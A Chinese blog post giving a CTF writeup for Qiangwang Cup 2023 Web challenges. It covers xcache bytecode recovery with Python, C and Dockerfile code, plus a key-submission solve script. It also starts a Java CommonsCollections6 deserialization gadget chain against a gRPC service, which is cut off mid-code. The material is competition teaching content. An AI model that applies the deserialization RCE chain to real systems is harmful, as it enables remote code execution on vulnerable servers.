<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-12-18T07:29:32.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>December</span>
            <span>18,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">第七届 强网杯 全国网络安全挑战赛 Web Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>考点：xcache逆向<br>114牛逼，下面贴一下佬的wp，我不会。<br>1.题目给出了phpinfo，给出了&#x2F;var&#x2F;www&#x2F;html&#x2F;b3debcdfb73572a549ac64da1c830d72这个路径可以下载到xcache的mmap缓存文件。<br>&#x2F;challenge.php需要提交一个key。<br>访问challenge.php后下载mmap文件，strings可以得到字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c6d4c9861179fe161d0233e3570998dc</span><br><span class="line">_GET</span><br><span class="line">strlen</span><br><span class="line">wrong answer</span><br><span class="line">str_split</span><br><span class="line">implode</span><br><span class="line">cat /flag</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
<p>2.下载到的缓存文件，里面有很多链表地址和函数（字节码回调函数，没有符号，readelf看不到，但是p&#x2F;i 0xxxx看一下都是endbr64指令）地址，不能直接加载。<br>修改源码。编辑xcache\mod_cacher\xc_cacher.c 加上固定地址加载代码，使得链表可以正常加载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">       #include &lt;sys/stat.h&gt;</span><br><span class="line">       #include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">void mymmap()&#123;</span><br><span class="line">int file1 = open(&quot;/tmp/clean_b3&quot;, O_RDONLY);</span><br><span class="line">    size_t ro_addr = 0x7fb5ed09c000;</span><br><span class="line">    size_t rw_addr = 0x7fb5ed09c000 + 0x4000000;</span><br><span class="line">    size_t ro_size=0x4000000;</span><br><span class="line">    int mmap1_result = mmap(ro_addr, ro_size, PROT_READ, MAP_PRIVATE| MAP_FIXED, file1, 0);</span><br><span class="line">    printf(&quot;mmap1_result: %d\n&quot;, mmap1_result);</span><br><span class="line">    int mmap2_result = mmap(rw_addr, ro_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED, file1, 0);</span><br><span class="line">    printf(&quot;mmap2_result: %d\n&quot;, mmap2_result);</span><br><span class="line">&#125;</span><br><span class="line">int is_replaced_1=0;</span><br><span class="line">在这个函数里面加 xc_php_find_unlocked：</span><br><span class="line">if(is_replaced_1 == 0)&#123;</span><br><span class="line">    is_replaced_1 = 1;</span><br><span class="line">    TRACE(&quot;1: xc_php_find_unlocked force return fake value %s&quot;,&quot;&quot;);</span><br><span class="line">    TRACE(&quot;1: size:%d&quot;,php-&gt;size);</span><br><span class="line">    mymmap();</span><br><span class="line">    char* ptr = 0x7fb5f10bc1e8;</span><br><span class="line">    return ptr;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    TRACE(&quot;1: xc_php_find_unlocked have already faked, do not fake again %s&quot;,&quot;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过函数指针，因为我们搭建了完全一样的libphp，所以可以推算libphp基址。替换函数指针，让字节码可以正常加载。<br>（找了一晚上指针。。。我的建议是，关闭靶机，重开，只访问challenge.php不访问info.php，这样得到的mmap是最纯净的）<br>本地关闭aslr方便调试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#找mmap基址</span><br><span class="line">from pwn import *</span><br><span class="line">filename = &quot;clean_b3&quot;</span><br><span class="line">with open(filename,&quot;rb&quot;) as f:</span><br><span class="line">    f.seek(0x20230)</span><br><span class="line">    ptr = u64(f.read(8))</span><br><span class="line">    # sanity check</span><br><span class="line">    f.seek(0x20290)</span><br><span class="line">    ptr2 = u64(f.read(8))</span><br><span class="line">    assert ptr2 &gt; 0x7f0000000000 and ptr2 &lt; 0x7fffffffffff</span><br><span class="line"></span><br><span class="line">delta = 0x20290</span><br><span class="line">root = ptr - delta</span><br><span class="line">print(&quot;ptr: &quot; + hex(ptr))</span><br><span class="line">print(&quot;delta: &quot; + hex(delta))</span><br><span class="line">print(&quot;ro_root: &quot; + hex(root))</span><br><span class="line">assert hex(root).endswith(&quot;000&quot;)</span><br><span class="line"># 远程开启了 xcache read only protection,因此同一个文件被mmap了两次，一个只读的和一个读写的。</span><br><span class="line">real_rw_root = root + 0x4000000</span><br><span class="line">print(&quot;rw_root: &quot; + hex(real_rw_root))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#用函数指针后3位地址找libphp的基址，然后把mmap文件里面远程的函数指针全部替换成本地的函数指针</span><br><span class="line">import re</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">remote_file = open(&quot;./clean_b3&quot;,&quot;rb&quot;)</span><br><span class="line">remote_data = remote_file.read()</span><br><span class="line">local_file = open(&quot;./result3&quot;,&quot;rb&quot;)</span><br><span class="line">local_data = local_file.read()</span><br><span class="line"></span><br><span class="line">remote_regex = br&#x27;.&#123;3&#125;\xff\xb5\x7f\x00\x00&#x27;</span><br><span class="line">local_regex = br&#x27;.&#123;3&#125;\xf6\xff\x7f\x00\x00&#x27;</span><br><span class="line">findall= re.findall(remote_regex,remote_data)</span><br><span class="line">findall = list(map(u64,findall))</span><br><span class="line">findall_pretty = list(set(list(map(hex,findall))))</span><br><span class="line">print(findall_pretty)</span><br><span class="line"></span><br><span class="line">findall_local = re.findall(local_regex,local_data)</span><br><span class="line">findall_local = list(map(u64,findall_local))</span><br><span class="line">findall_local_pretty = list(set(list(map(hex,findall_local))))</span><br><span class="line">print(findall_local_pretty)</span><br><span class="line"></span><br><span class="line">for entry in findall_local_pretty:</span><br><span class="line">    for remote_entry in findall_pretty:</span><br><span class="line">        # if the last 3 bytes are the same</span><br><span class="line">        if entry[-3:] == remote_entry[-3:]:</span><br><span class="line">            print(&quot;match: &quot;,entry,remote_entry)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">match:  0x7ffff6d7ebe0 0x7fb5ff0ebbe0</span><br><span class="line">match:  0x7ffff66d93c0 0x7fb5ff0eb3c0</span><br><span class="line">match:  0x7ffff6def080 0x7fb5ff15c080</span><br><span class="line">match:  0x7ffff6df1cf0 0x7fb5ff15ecf0</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">local_entry = 0x7ffff6d7ebe0</span><br><span class="line">remote_entry = 0x7fb5ff0ebbe0</span><br><span class="line"># local have aslr disabled.</span><br><span class="line">local_base = 0x7ffff6af4000</span><br><span class="line">local_delta = local_entry - local_base</span><br><span class="line">print(&quot;local delta: &quot;,hex(local_delta))</span><br><span class="line"></span><br><span class="line">remote_base = remote_entry - local_delta</span><br><span class="line">print(&quot;remote base: &quot;,hex(remote_base))</span><br></pre></td></tr></table></figure>
<p>替换mmap文件里面的函数指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">data = open(&quot;clean_b3&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">remote_libphp_base = 0x7fb5fee61000 # changeme</span><br><span class="line">local_libphp_base = 0x7ffff76f6000 # changeme 或者如果你关闭了aslr，理论上会得到和这个一样的本地地址</span><br><span class="line"></span><br><span class="line">remote_regex = br&#x27;.&#123;3&#125;\xff\xb5\x7f\x00\x00&#x27; # changeme</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def repl(m):</span><br><span class="line">    contents = m.group(0)</span><br><span class="line">    remote_ptr = u64(contents)</span><br><span class="line">    local_ptr = remote_ptr - remote_libphp_base + local_libphp_base</span><br><span class="line">    print(f&quot;replace &#123;hex(remote_ptr)&#125; with &#123;hex(local_ptr)&#125;&quot;)</span><br><span class="line">    return p64(local_ptr)</span><br><span class="line"></span><br><span class="line">data = re.sub(remote_regex, repl, data)</span><br><span class="line"></span><br><span class="line">with open(&quot;/tmp/clean_b3_mod&quot;,&quot;bw&quot;) as f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>
<p>3.本地搭建完全一样的php版本（差一点都不行，必须完全一样，直接用它那个deb.sury.org源下载，因为有函数指针），并且安装xdebug,自己编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:22.04</span><br><span class="line"></span><br><span class="line">ENV TZ=Asia/Shanghai \</span><br><span class="line">    DEBIAN_FRONTEND=noninteractive</span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g&quot; /etc/apt/sources.list &amp;&amp; sed -i &quot;s/http:\/\/security.ubuntu.com/http:\/\/mirrors.aliyun.com/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">apt update &amp;&amp; apt install -y software-properties-common &amp;&amp; add-apt-repository ppa:ondrej/php -y &amp;&amp; apt install -y php5.6 php5.6-cli</span><br><span class="line">RUN apt install -y php5.6-dev</span><br><span class="line">ADD ./xdebug-2.5.5 /tmp/xdebug</span><br><span class="line">RUN cd /tmp/xdebug \</span><br><span class="line">    &amp;&amp; phpize \</span><br><span class="line">    &amp;&amp; ./configure --enable-xdebug \</span><br><span class="line">    &amp;&amp; make -j$(nproc) \</span><br><span class="line">    &amp;&amp; make install \</span><br><span class="line">    &amp;&amp; cd /</span><br><span class="line">ADD ./xcache /tmp/xcache</span><br><span class="line">RUN cd /tmp/xcache \</span><br><span class="line">    &amp;&amp; phpize \</span><br><span class="line">    &amp;&amp; ./configure --enable-xcache --enable-xcache-disassembler \</span><br><span class="line">    &amp;&amp; make -j$(nproc) \</span><br><span class="line">    &amp;&amp; make install \</span><br><span class="line">    &amp;&amp; cd /</span><br><span class="line">COPY xcache.ini /tmp/</span><br><span class="line">COPY challenge.php /var/www/html/</span><br><span class="line">COPY info.php /var/www/html/</span><br><span class="line">RUN cat /tmp/xcache.ini &gt;&gt; /etc/php/5.6/apache2/php.ini &amp;&amp; touch /var/www/html/b3debcdfb73572a549ac64da1c830d72 &amp;&amp; chmod 777 /var/www/html/b3debcdfb73572a549ac64da1c830d72</span><br><span class="line"># RUN echo &#x27;extension = xcache.so&#x27; &gt; /etc/php/5.6/mods-available/xcache.ini</span><br><span class="line">RUN echo &#x27;extension = xcache.so&#x27; &gt; /etc/php/5.6/apache2/conf.d/20-xcache.ini</span><br><span class="line">RUN echo &#x27;zend_extension=/usr/lib/php/20131226/xdebug.so&#x27; &gt; /etc/php/5.6/apache2/conf.d/99-xdebug.ini</span><br><span class="line">RUN echo &#x27;[Xdebug]&#x27; &gt;&gt; /etc/php/5.6/apache2/conf.d/99-xdebug.ini</span><br><span class="line">RUN echo &#x27;xdebug.auto_trace=On&#x27; &gt;&gt; /etc/php/5.6/apache2/conf.d/99-xdebug.ini</span><br><span class="line">RUN echo &#x27;xdebug.collect_params=1&#x27; &gt;&gt; /etc/php/5.6/apache2/conf.d/99-xdebug.ini</span><br><span class="line">RUN echo &#x27;xdebug.collect_return=1&#x27; &gt;&gt; /etc/php/5.6/apache2/conf.d/99-xdebug.ini</span><br><span class="line">RUN echo &#x27;xdebug.collect_assignments=1&#x27; &gt;&gt; /etc/php/5.6/apache2/conf.d/99-xdebug.ini</span><br><span class="line">RUN echo &#x27;xdebug.collect_vars=1&#x27; &gt;&gt; /etc/php/5.6/apache2/conf.d/99-xdebug.ini</span><br><span class="line">RUN ln -sf /proc/self/fd/1 /var/log/apache2/access.log &amp;&amp; \</span><br><span class="line">    ln -sf /proc/self/fd/1 /var/log/apache2/error.log</span><br><span class="line">CMD apachectl -D FOREGROUND -X</span><br></pre></td></tr></table></figure>
<p>docker run –name dump –network&#x3D;host –privileged –rm -it -v &#x2F;tmp&#x2F;clean_b3_mod:&#x2F;tmp&#x2F;clean_b3:ro test1<br>4.运行后，访问本地&#x2F;challenge.php，则会被替换成题目给出的字节码。<br>因为xcache里面只有字节码，所以无法导出php源码，调试比较困难。但是xdebug可以正常工作。<br>利用xdebug trace日志，多次输入测试得知，用户输入key长度需要是32，key的前14个字节会被异或一个key，后18个字节会被异或另一个key，然后与strings看到的字符串c6d4c9861179fe161d0233e3570998dc比较。（字符串会变化）<br>如果比较正确会system cat &#x2F;flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TRACE START [2023-12-16 17:53:20]</span><br><span class="line">    0.0000     232096   -&gt; &#123;main&#125;() /var/www/html/challenge.php:0</span><br><span class="line">    0.0001     232440     -&gt; strlen(string(32)) /var/www/html/challenge.php:5</span><br><span class="line">    0.0001     232440      &gt;=&gt; 32</span><br><span class="line">    0.0001     232440     -&gt; str_split(string(32)) /var/www/html/challenge.php:9</span><br><span class="line">    0.0001     238176      &gt;=&gt; array (0 =&gt; &#x27;O&#x27;, 1 =&gt; &#x27;\032&#x27;, 2 =&gt; &#x27;H&#x27;, 3 =&gt; &#x27;\030&#x27;, 4 =&gt; &#x27;O&#x27;, 5 =&gt; &#x27;\025&#x27;, 6 =&gt; &#x27;\024&#x27;, 7 =&gt; &#x27;\032&#x27;, 8 =&gt; &#x27;\035&#x27;, 9 =&gt; &#x27;\035&#x27;, 10 =&gt; &#x27;\033&#x27;, 11 =&gt; &#x27;\025&#x27;, 12 =&gt; &#x27;J&#x27;, 13 =&gt; &#x27;I&#x27;, 14 =&gt; &#x27;�&#x27;, 15 =&gt; &#x27;�&#x27;, 16 =&gt; &#x27;�&#x27;, 17 =&gt; &#x27;�&#x27;, 18 =&gt; &#x27;�&#x27;, 19 =&gt; &#x27;�&#x27;, 20 =&gt; &#x27;�&#x27;, 21 =&gt; &#x27;�&#x27;, 22 =&gt; &#x27;�&#x27;, 23 =&gt; &#x27;�&#x27;, 24 =&gt; &#x27;�&#x27;, 25 =&gt; &#x27;�&#x27;, 26 =&gt; &#x27;�&#x27;, 27 =&gt; &#x27;�&#x27;, 28 =&gt; &#x27;�&#x27;, 29 =&gt; &#x27;�&#x27;, 30 =&gt; &#x27;�&#x27;, 31 =&gt; &#x27;�&#x27;)</span><br><span class="line">    0.0001     238472     -&gt; implode(array(32)) /var/www/html/challenge.php:16</span><br><span class="line">    0.0001     241792      &gt;=&gt; &#x27;c6d4c9861179fe161d0233e3570998dc&#x27;</span><br><span class="line">    0.0001     238552     -&gt; system(string(9)) /var/www/html/challenge.php:17</span><br><span class="line">    0.0014     238664      &gt;=&gt; &#x27;flag&#x27;</span><br><span class="line">    0.0014     238552    &gt;=&gt; 1</span><br><span class="line">    0.0015       8368</span><br><span class="line">TRACE END   [2023-12-16 17:53:20]</span><br></pre></td></tr></table></figure>
<p>异或是单字节异或固定key，本地通过日志读一下异或后implode的返回值，逆或一次得到key即可。<br>经过测试是，每次开启靶机，32位长度的字符串会变化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rs = requests.Session()</span><br><span class="line"></span><br><span class="line">data = b&#x27;a&#x27;*32</span><br><span class="line">r = rs.get(&#x27;http://127.0.0.1/challenge.php&#x27;, params=&#123;&#x27;key&#x27;: data&#125;)</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line">output = subprocess.check_output(&quot;docker exec -it dump bash -c &#x27;cat /tmp/trace*&#x27;&quot;,shell=True)</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">regex = re.compile(rb&quot; &gt;=&gt; &#x27;(.&#123;32&#125;)&#x27;&quot;)</span><br><span class="line">matched = regex.findall(output)</span><br><span class="line">key_ = matched[0]</span><br><span class="line"></span><br><span class="line">key = b&#x27;&#x27;</span><br><span class="line">for i in range(len(key_)):</span><br><span class="line">    key += bytes([key_[i] ^ ord(&#x27;a&#x27;)])</span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line">cipher = b&#x27;936998e2dbec20ad5a37dc8f06f7d672&#x27;</span><br><span class="line">xored_cipher = b&#x27;&#x27;</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">    xored_cipher += bytes([cipher[i] ^ key[i]])</span><br><span class="line">print(xored_cipher)</span><br><span class="line"></span><br><span class="line">r2 = rs.get(&#x27;http://eci-2ze245ak3rvctqp48pe0.cloudeci1.ichunqiu.com/challenge.php&#x27;, params=&#123;&#x27;key&#x27;: xored_cipher&#125;)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>





<h1 id="happygame"><a href="#happygame" class="headerlink" title="happygame"></a>happygame</h1><p>grpc_cli cc6<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883554819-cae984c7-5804-4bb0-8928-af07a46dca3f.png#averageHue=%234c515c&clientId=uad25b9a3-adf4-4&from=paste&height=69&id=udd5175e3&originHeight=69&originWidth=450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48893&status=done&style=none&taskId=u0df2e3d9-c700-4956-96d2-456046663e5&title=&width=450" alt="image.png"><br>我们得到了2个method，我们分别查看一下2个method的具体信息<br><code>grpc_cli ls 8.147.128.227:32866 helloworld.Greeter -l</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883589923-017b48d7-9588-4c5e-8459-ad8f643b36d2.png#averageHue=%23525661&clientId=uad25b9a3-adf4-4&from=paste&height=282&id=u3705df32&originHeight=282&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&size=493156&status=done&style=none&taskId=uf5e13ecd-fc12-47d7-b1d2-6456430c874&title=&width=1176" alt="image.png"><br><code>grpc_cli type 8.147.128.227:32866 helloworld.Request</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883682760-9f2306e3-dba9-4edb-abbb-fd773e5a0864.png#averageHue=%23434a55&clientId=uad25b9a3-adf4-4&from=paste&height=114&id=u3c6121be&originHeight=114&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104628&status=done&style=none&taskId=ub130e80e-4ca3-4a25-88d2-2821a66d42a&title=&width=627" alt="image.png"><br>发现其中的Request是一个序列化的data，那么我这里就盲猜，对就是盲猜是反序列化，测试发现有cc依赖，直接打就好了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.cc;</span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hashmap(hashcode)-&gt;TiedmapEntry(hashcode)-&gt;TiedMapEntry(getvalue)-&gt;Lazymap(get)-&gt;transform</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span 